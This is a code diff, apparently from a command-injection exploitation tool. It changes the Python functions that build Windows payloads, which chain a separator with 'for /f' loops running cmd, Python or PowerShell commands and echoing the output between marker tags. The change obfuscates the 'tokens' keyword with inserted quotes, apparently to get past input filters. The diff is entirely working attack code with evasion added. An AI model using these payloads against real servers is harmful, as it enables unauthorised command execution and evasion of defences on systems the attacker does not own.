@@ -31,7 +31,7 @@ def decision(separator, TAG, randv1, randv2):
                 )
     else:
         payload = (separator +
-              "for /f \"tokens=*\" %i in ('cmd /c \"" + 
+              "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" + 
               "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
               "\"') do @set /p = " + TAG + "%i" + TAG + TAG + "< nul"
               )  
@@ -84,7 +84,7 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
       python_payload = settings.WIN_PYTHON_DIR + " -c \"print '" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "'\""
      
     payload = (separator +
-              "for /f \"tokens=*\" %i in ('cmd /c " + 
+              "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
               python_payload +
               "') do @set /p =%i< nul"
               )
@@ -114,7 +114,7 @@ def cmd_execution(separator, TAG, cmd):
                 )
     else:
       payload = (separator +
-                "for /f \"tokens=*\" %i in ('cmd /c \"" + 
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" + 
                 cmd + 
                 "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + "< nul"
                 )
@@ -152,7 +152,7 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
                 )
     else:
       payload = (separator +
-                "for /f \"tokens=*\" %i in ('" + 
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('" + 
                 settings.WIN_PYTHON_DIR + " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
                 "') do @set /p =%i< nul"
                 )
